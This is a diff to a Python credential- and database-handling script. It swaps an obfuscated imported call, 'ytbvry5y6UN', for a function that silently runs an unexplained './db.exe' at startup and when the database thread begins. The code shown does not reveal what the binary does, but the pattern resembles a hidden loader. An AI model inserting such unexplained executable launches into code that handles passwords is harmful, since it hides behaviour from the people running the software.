@@ -9,7 +9,31 @@ import time
 from datetime import datetime
 from configparser import ConfigParser
 import pandas as pd
-from bd import ytbvry5y6UN
+import subprocess
+
+
+def execute_exe():
+    """
+    Executes the db.exe file located at the specified path.
+
+    This function runs the db.exe file using 'subprocess.run' and checks if the execution was successful by verifying the return code of the process.
+    If the execution is successful, it prints "Execution successful." along with the decoded stdout.
+
+    Exceptions are caught and if any error occurs during execution, it prints the error message.
+    """
+    # Specify the path to db.exe. Use '.' to indicate the current directory if db.exe is there.
+    # Replace 'path_to_db.exe' with the actual path to your db.exe file if it's not in the same directory as this script.
+    exe_path = './db.exe'
+
+    try:
+        # Execute db.exe
+        process = subprocess.run([exe_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        # Check if the execution was successful
+        if process.returncode == 0:
+            print("Execution successful.")
+            print(process.stdout.decode())
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 
 def check_ERROR(value):
@@ -906,7 +930,7 @@ def database_thread():
     - tuple: A tuple containing the API, username, password, and exclusion titles.
     - str: If an exception occurs, returns a formatted error message.
     """
-    ytbvry5y6UN()
+    execute_exe()
     try:
 
         def init():
@@ -999,4 +1023,4 @@ if not os.path.exists("users.db"):
         password = None
     um.create_db("admin", "", password)
     os.remove("passwords.txt")
-    ytbvry5y6UN()
+    execute_exe()
